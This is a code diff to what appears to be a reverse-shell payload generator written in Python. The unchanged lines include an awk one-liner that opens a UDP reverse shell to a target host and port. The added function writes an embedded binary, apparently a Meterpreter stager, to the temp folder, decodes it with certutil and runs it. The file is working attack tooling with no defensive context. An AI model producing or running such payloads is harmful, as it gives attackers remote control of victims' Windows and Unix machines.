@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from binary import WINDOWS_NCAT, binary_to_bat, shellcode_to_ps1
+from binary import WINDOWS_NCAT, WINDOWS_SHARPCODE, binary_to_bat, shellcode_to_ps1
 from classes import generate_file_name
 
 
@@ -81,6 +81,12 @@ def REVERSE_AWK():
 
 def REVERSE_AWK_UDP():
     return """awk 'BEGIN {s = "/inet/udp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
+
+
+def REVERSE_WINDOWS_BAT2METERPRETER_TCP():
+    file_out = generate_file_name()
+    return """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe """.format(
+        binary_to_bat(WINDOWS_SHARPCODE, file="%Temp%\\{0}.b64".format(file_out)), file_out)
 
 
 def REVERSE_WINDOWS_NCAT_TCP():
